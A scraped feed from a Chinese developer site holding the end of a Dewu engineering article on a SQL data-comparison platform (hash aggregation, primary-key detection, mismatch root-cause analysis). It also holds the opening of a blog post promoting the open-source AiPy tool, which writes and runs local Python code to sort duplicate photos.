<pre><code class="hljs language-scss" lang="scss">SELECT count (*),<span class="hljs-built_in">SUM</span>(xxhash64(cloum1)^<span class="hljs-built_in">xxhash64</span>(cloum2)^...) FROM tableA 
EXCEPT 
SELECT <span class="hljs-built_in">count</span>(*),<span class="hljs-built_in">SUM</span>(xxhash64(cloum1)^<span class="hljs-built_in">xxhash64</span>(cloum2)^...) FROM tableB
</code></pre>
<p>如果有记录为空说明数据一致，不为空说明数据不一致需要采用上面提到union 分组的方法去找出具体字段哪里不一样。</p>
<p>通过哈希值聚合，单个任务比数时间从500s降低到160s，节省大约70%的时间。</p>
<p>找到两张表不一致数据后需要对两张的数据进行分析确定不一致的点在哪里？这里就需要知道表的主键，根据主键逐个比对两张表的其他字段，因此系统会先进行主键的自动探查，以及无主键的兜底处理。</p>
<h3 data-id="heading-7">精准定位异常数据实现方法</h3>
<p><strong>自动探查主键：实现原理如下</strong></p>
<p>刚开始我们采用的前5个字段找主键的方式，如下：</p>
<pre><code class="hljs language-sql" lang="sql">针对表a的前<span class="hljs-number">5</span>个字段 循环比对
<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-keyword">distinct</span> id) <span class="hljs-keyword">from</span> a 与 <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> a 比较 ，如相等主键为id ，不相等继续往下执行
<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-keyword">distinct</span> id,name) <span class="hljs-keyword">from</span> a 与 <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> a比较，如相等主键为id,name ，不相等继续往下执行
<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-keyword">distinct</span> id,name,age) <span class="hljs-keyword">from</span> a 与 <span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-number">1</span>) <span class="hljs-keyword">from</span> a比较，如相等主键为id,name,age ，不相等继续往下执行，直到循环结束
</code></pre>
<p>采用上面的方法不一致任务中大约有49.6%任务自动探查主键失败：因此需重点提升主键识别能力。</p>
<p>针对以上主键探查成功率低的问题，后续进行了一些迭代，优化后的主键探查流程如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/25de1d35ecd9418799133d350c66238f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=Wjo6Kt0tO3xPN7AfPoPRzpqHXII%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><strong>一、先采用sum(hash)高效计算方式进行探查：</strong></p>
<p>1.先算出两张表每个字段的sum(hash)值  。</p>
<pre><code class="hljs language-python" lang="python">select <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(<span class="hljs-built_in">id</span>)),<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(name)),<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(age)),<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(score)) <span class="hljs-keyword">from</span> a 
union <span class="hljs-built_in">all</span> 
select <span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(<span class="hljs-built_in">id</span>)),<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(name)),<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(age)),<span class="hljs-built_in">sum</span>(<span class="hljs-built_in">hash</span>(score)) <span class="hljs-keyword">from</span> b;
</code></pre>
<p>2.找出值相等的所有字段，本案例中为 id, name。</p>
<p>3.对id，name 可能是主键进一步确认，先进行行数校验，如 select count(distinct id,name) from a 的值等于select count(1) from a 则进一步校验，否则进入到第二种探查主键方式。</p>
<p>4.唯一性验证，如果值为0则表示探查主键成功，否则进入到第二种探查主键方式。</p>
<pre><code class="hljs language-sql" lang="sql">slect <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">from</span> ((<span class="hljs-keyword">select</span> id,name <span class="hljs-keyword">from</span> a ) expect (<span class="hljs-keyword">select</span> id,name <span class="hljs-keyword">from</span> b))
</code></pre>
<p><strong>二、传统distinct方式探查：</strong></p>
<p>针对表a的前N（所有字段数/2或者前N、后N等）个字段 循环比对：</p>
<p>1.select count(distinct id) from a与select count(1) from a比较 ，如相等主键为id ，不相等继续往下执行。</p>
<p>2.select count(distinct id,name) from a 与 select count(1) from a比较，如相等主键为id,name ，不相等继续往下执行。</p>
<p>3.select count(distinct id,name,age) from a 与 select count(1) from a比较，如相等主键为id,name,age ，不相等继续往下执行，直到循环结束。</p>
<p><strong>三、全字段排序模拟:</strong></p>
<p>如果上面两种方式还是没有找到主键则把不一致记录表进行全字段排序然后对第一条和第二条记录挨个字段进行分析，找出不一致内容，示例如下：</p>
<pre><code class="hljs language-sql" lang="sql">slect <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> a_b_diff_20240908 <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id,name,age,score <span class="hljs-keyword">asc</span> limit <span class="hljs-number">10</span>;
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ef9f06f43484d919849196643d03729~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=93VYsc%2F3m8FGe%2F%2BFZ4xlzVDTTwM%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>通过以上结果表可以得出两表的age字段不一致 ，score不一致（但按key排序后一致）。</p>
<p>如果以上自动化分析还是找不到不一致字段内容，可以人工确认表的主键后到平台手动指定主键字段，然后点击后续分析即可按指定主键去找字段不一致内容。</p>
<p>通过多次迭代优化找主键策略，找主键成功率从最初的50.4%提升到75%，加上全字段order by排序后最前两条数据进行分析，相当于可以把找主键的成功率提升到90%以上。</p>
<p><strong>根因分析：实现原理如下</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8ffcd921dc69410094ec2ad734d3d602~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=kmEILGcn3E9X17tys3Y5%2FUB5IZ4%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>当数据不一致时，平台会根据主键找出两个表哪些字段数据不一致并进行分析，具体如下：</p>
<ul>
<li><strong>精准定位：</strong> 明确指出哪条记录、哪个字段存在差异，并展示具体的源数据和目标数据值。</li>
<li><strong>智能根因分析：</strong> 内置了多种差异模式识别规则，能够自动分析并提示不一致的可能原因，例如：</li>
<li>精度问题：如浮点数计算1.0000000001与1.0的差异。</li>
<li>JSON序列化差异：如{"a":1, "b":2}与{"b":2, "a":1}，在语义一致的情况下，因键值对顺序不同而被标记为差异。同时系统会提示排序后一致。</li>
<li>空值处理差异：如NULL值与空字符串""的差异判定。</li>
<li>日期时区转换问题：时间戳在不同时区下表示不同。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/26c3c92ec4094f0eb0dc64b0c3a3daaa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=PQ4B4wonmvnK84sqnaWxqZlsgM8%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/db0212b45a6146c198ea412952b6c8ae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=doO%2B5Vt8WX%2FyAR4AE3z8DGP3Kqk%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li><strong>比对结果统计：</strong> 提供总数据量、一致数据量、不一致数据量及不一致率百分比，为项目决策提供清晰的量化依据。</li>
<li>比数人员根据平台分析的差异原因，决定是否手动标记通过或进行任务修复。</li>
<li>效果展示：</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/566d75faee4a4dcc8c8e637eadd32d6b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=Qup%2FMQqwspWtDPW4WNLQ2poZzcw%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h2 data-id="heading-8">四、比数平台功能介绍</h2>
<h3 data-id="heading-9">数据比对基本流程</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c09f97130ba45678aec2b50638b2aee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=9hhTVjtN0R7usRnpaw%2BwbwtCvkI%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<h3 data-id="heading-10">任务生成：三种比对模式</h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bbb2b1b4aa2c49ea8e0b6a80477808bd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=YRfferO3wRHg%2FjEP7FpFuLC70CE%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<ul>
<li><strong>两表比对：</strong> 最直接的比对方式。用户只需指定源表与目标表，平台即可启动全量数据比对。它适用于临时比对的场景。</li>
<li><strong>任务节点比对：</strong> 一个任务可能输出多个表，逐一配置这些表的比对任务繁琐且易遗漏，任务节点比对模式完美解决了这一问题。用户只需提供任务节点ID，平台便会自动解析该节点对应的SQL代码，提取出所有输出表，并自动生成比对任务，极大地提升任务迁移比对效率。</li>
<li><strong>SQL查询比对：</strong> 业务在进行SDK迁移只关心某些查询在迁移后数据是否一样，因此需要对用户提交的所有查询SQL进行比对，平台会分别在ODPS和Spark引擎上执行该查询，将结果集导出到两张临时表，再生成比对任务。</li>
</ul>
<h3 data-id="heading-11">前置校验：提前发现问题</h3>
<p>在启动耗时的全量比对之前，需要对任务进行前置校验，确保比对是在表结构一致、集群环境正常的情况下进行，否则一旦启动比数会占用大量计算资源，最后结果还是比数不通过，会影响比数平台整体的运行效率。因此比数平台一般会针对如下问题进行前置拦截。</p>
<ul>
<li><strong>元数据一致性校验：</strong> 比对双方的字段名、字段类型、字段顺序、字段个数是否一致。</li>
<li><strong>函数缺失校验：</strong> 针对Spark引擎，校验SQL中使用的函数是否存在、是否能被正确识别，避免因函数不支持而导致的比对失败。</li>
<li><strong>语法问题校验：</strong> 分析SQL语句的语法结构，确保其在目标引擎中能够被顺利解析，避免使用了某些特定写法会导致数据出现不一致情况，提前发现语法层面问题，并对任务进行改写。</li>
</ul>
<p><strong>更多校验点如下：</strong></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40910e32074f4c28b70c5226fe902490~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=cl7EeqzAo8AMMIzBZASeWeuzhSI%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30dbeda7f2a446b99d9ee8fc0d9c6c6a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=6g%2BNoCOop3TpZbTpS0mtpBEIKl4%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a120da92c35046a1aee83c9da7f81915~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=jC9MNlPrk1%2FlYM1LW1%2FVh%2BDyB1I%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>通过增加以上前置校验拦截，比数任务数从每天3000+<strong>下降到1500+，</strong> 减少<strong>50%</strong> 的无效比数，其中UDF缺失最多，有效拦截任务1238，缺少函数<strong>87个</strong>（帮比数同学快速定位，一次性解决函数缺失问题，避免多次找引擎同学陆陆续续添加，节省双方时间成本）。</p>
<h3 data-id="heading-12">破解比数瓶颈：资源分配与任务调度优化</h3>
<p>由于比数平台刚上线的时候只有计算迁移团队在使用，后面随着更多的团队开始使用，性能遇到了如下瓶颈：</p>
<p><strong>1.资源不足问题：</strong> 不同业务（计算迁移、存储迁移、SDK迁移）的任务相互影响，基本比数任务与根因分析任务相互抢占资源。</p>
<p><strong>2.任务编排不合理：</strong> 没有优先级导致大任务阻塞整体比数进程。</p>
<p><strong>3.引擎参数设置不合理：</strong> 并行度不够、数据分块大小等高级参数。</p>
<p>针对以上问题比数平台进行了如下优化：</p>
<ul>
<li>按不同业务拆分成多个队列来运行，保证各个业务之间的比数任务可以同时进行，不会相互影响。</li>
<li>根因分析使用单独的队列，与数据比对任务的队列分开，避免相互抢占资源发生“死锁”。</li>
<li>相同业务内部按批次分时段、分优先级运行，保障重要任务优先进行比对。</li>
<li>针对Spark引擎默认调优了公共参数、并支持用户自主设置其他高级参数。</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df0b85bd8ac74968b0b75b0d7ee4b9dd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5b6X54mp5oqA5pyv:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769494627&amp;x-signature=35%2FJ9DEW8CBXqiho9N9hYZA0Mtw%3D" alt="" loading="lazy"/><a href="https://link.juejin.cn?target=" title="" ref="nofollow noopener noreferrer"/></p>
<p>通过以上优化达到到了如下效果：</p>
<ul>
<li>比数任务从每天22点完成提前至<strong>18点</strong>前，同时支持比数同学自主控制高优任务优先执行，方便比数同学及时处理不一致任务。</li>
<li>通过优化资源队列使用方式，使系统找不到主键辅助用户自主找主键接口响应时间<strong>从58.5秒降到 26.2秒。</strong></li>
</ul>
<h2 data-id="heading-13">五、比数平台收益分享</h2>
<p>平台持续安全运行500+天，每日可完成2000+任务比对，有效比数128万+次，0误判。</p>
<ul>
<li>助力计算迁移团队节省45+人日/月，完成数据分析、离线数仓空间任务的比对、交割。</li>
<li>助力存储迁移团队完成20%+存储数据的迁移。</li>
<li>助力引擎团队完成800+批次任务的回归验证，确保每一次引擎发布的安全及高效。</li>
<li>助力SDK迁移团队完成80%+应用的迁移。</li>
</ul>
<h2 data-id="heading-14">六、未来演进方向</h2>
<p>接下来，平台计划在以下方面持续改进：</p>
<p><strong>智能分析引擎：</strong> 针对Json复杂嵌套类型的字段接入大模型进行数据根因分析，找出不一致内容。</p>
<p><strong>比对策略优化：</strong> 针对大表自动切分进行比对，降低比数过程出现因数据量大导致异常，进一步提升比对效率。</p>
<p><strong>通用方案沉淀：</strong> 将典型的比对场景和解决方案能用化，应用到更多场景及团队中去。</p>
<h2 data-id="heading-15">七、结语</h2>
<p>比数平台是得物在迁移过程中，为了应对海量任务、大数据量、字段内容复杂多样、异常数据难定位等挑战，确保业务迁移后数据准确而专门提供的解决方案，未来它不单纯是一个服务计算迁移、存储迁移、SDK迁移、Spark版本升级等需要的数据比对工具，而是演进为数据平台中不可或缺的基础设施。</p>
<h3 data-id="heading-16">往期回顾</h3>
<p>1.得物App智能巡检技术的探索与实践</p>
<p>2.深度实践：得物算法域全景可观测性从 0 到 1 的演进之路 </p>
<p>3.前端平台大仓应用稳定性治理之路｜得物技术</p>
<p>4.RocketMQ高性能揭秘：承载万亿级流量的架构奥秘｜得物技术</p>
<p>5.PAG在得物社区S级活动的落地</p>
<h3 data-id="heading-17">文 /Galaxy平台</h3>
<p>关注得物技术，每周更新技术干货</p>
<p>要是觉得文章对你有帮助的话，欢迎评论转发点赞～</p>
<p>未经得物技术许可严禁转载，否则依法追究法律责任。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[你的AI 牛马已就位，解放双手！]]></title>    <link>https://juejin.cn/post/7597650624636796928</link>    <guid>https://juejin.cn/post/7597650624636796928</guid>    <pubDate>2026-01-21T10:22:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597650624636796928" data-draft-id="7597623654056067087" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="你的AI 牛马已就位，解放双手！"/> <meta itemprop="keywords" content="人工智能,AIGC,AI编程"/> <meta itemprop="datePublished" content="2026-01-21T10:22:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="CUGGZ"/> <meta itemprop="url" content="https://juejin.cn/user/3544481220801815"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            你的AI 牛马已就位，解放双手！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3544481220801815/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    CUGGZ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T10:22:57.000Z" title="Wed Jan 21 2026 10:22:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>这两天 AI 圈都在疯传 Anthropic 的新动作：Claude Cowork。主打一个“AI 替你手动操作电脑”的概念。我看完演示视频第一反应是真香，第二反应是告辞。</p>
<p>且不说它目前仅限 macOS，光是那个门槛就直接劝退：必须是顶级会员，月费高达 200 刀。换算成人民币，每个月得掏快 1500 块。说实话，就我这点儿牛马工资，养活自己都费劲，实在供不起一个每月 1500 元的数字大爷。</p>
<p>其实，想体验这种“AI 给我打工”的感觉，真没必要舍近求远。我折腾了几天一个叫 AiPy（爱派） 的开源项目，感受只有一句话：这才是普通职场人能真正白嫖、且敢在本地跑的“数字牛马”。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a46bb07296fa4a24a49dd4a8fb2b0bf4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ1VHR1o=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595777&amp;x-signature=a8JtJW%2BRF1FBMN2Vmf%2B27npn9BM%3D" alt="" loading="lazy"/></p>
<p>添加图片注释，不超过 140 字（可选）</p>
<blockquote>
<p>官网：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.aipyaipy.com%2F" target="_blank" title="https://www.aipyaipy.com/" ref="nofollow noopener noreferrer">www.aipyaipy.com/</a></p>
<p>Github：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fknownsec%2Faipyapp" target="_blank" title="https://github.com/knownsec/aipyapp" ref="nofollow noopener noreferrer">github.com/knownsec/ai…</a></p>
</blockquote>
<h2 data-id="heading-0">它是 AI，但它真的“长了手”</h2>
<p>很多人把 AI 当成聊天机器人，但 AiPy 的逻辑是 Python-Use。</p>
<p>简单来说就是：它不只是有个能思考的大脑，还长了一双能操作你电脑的“手”。它不是那种只会跟你玩文字游戏的 AI，而是能直接根据你的需求，在后台自动生成 Python 代码、运行程序、甚至自己给自己找 Bug 调优。</p>
<p>最赞的是，它把代码过程全隐藏了。你不需要懂 Python，只需要说人话。它就在你本地系统里动态地“制造”工具来解决问题。这种 “你提需求，它流汗” 的闭环方案，比那些只会吐字的 AI 强太多了。</p>
<h2 data-id="heading-1">比国外大牌更接地气</h2>
<ul>
<li>真·白嫖友好： 开源项目，注册就送海量 Token，不像某 Claude 还没用就先割你一刀。</li>
<li>不挑设备： Windows、Mac、Linux 都能跑，不用为了用 AI 专门去配个苹果电脑。</li>
<li>隐私安全： 它是本地运行，数据不出你的机器。处理工资单、公司私密文档时，不用担心被云端“偷窥”。</li>
<li>断网也能干活： 支持调用本地私有模型，就算你单位是断网的内网环境，它也能照样当牛马。</li>
</ul>
<h2 data-id="heading-2">实测：整理 50G 混乱图片，它能帮我省下几个小时？</h2>
<p>为了测测它到底行不行，我给自己出了个平时最头疼的难题：整理桌面上一个 50G 的巨型文件夹。</p>
<p>里面塞满了这几年的照片，相似的、重复的一大堆。如果人工筛选，我估计得看到眼瞎。我直接把这个文件夹丢给我的“小牛马”：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f2a511662584197a51220a758ea50bf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ1VHR1o=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595777&amp;x-signature=OVvHXzdskpUA3MJ99cLrUWiU8b8%3D" alt="" loading="lazy"/></p>
<p>添加图片注释，不超过 140 字（可选）</p>
<h3 data-id="heading-3">他的打工过程是这样的：</h3>
<ol>
<li>自动拆解： 它立刻分析出需要先扫描文件夹、计算图片哈希值、对比相似度。</li>
<li>硬核执行： 咔咔几秒钟，它自己写了一个 Python 脚本并开始在后台运行。</li>
<li>交付清单： 整个过程跑了 12 分钟。虽然不算秒开，但对比我人工筛选几个小时的工作量，这简直是神速。</li>
</ol>
<p>最终，它给我吐出了一份《可删除照片名单》。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/516da6101c3a4acdb89afb8573c63105~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQ1VHR1o=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769595777&amp;x-signature=W1Y4hJOf3WMeAQI4X0eq0IriKnQ%3D" alt="" loading="lazy"/></p>
<p>添加图片注释，不超过 140 字（可选）</p>
<p>我随手抽检了几个，准确度超过 80%！剩下的 20% 主要是因为审美主观判断（比如两张连拍我更喜欢哪一张），但在过滤重复和模糊照片上，它表现得极其硬核。</p>
<p>我能看到它在“干活”，但我不需要参与。这种“你张嘴，它流汗”的感觉，确实上头。</p>
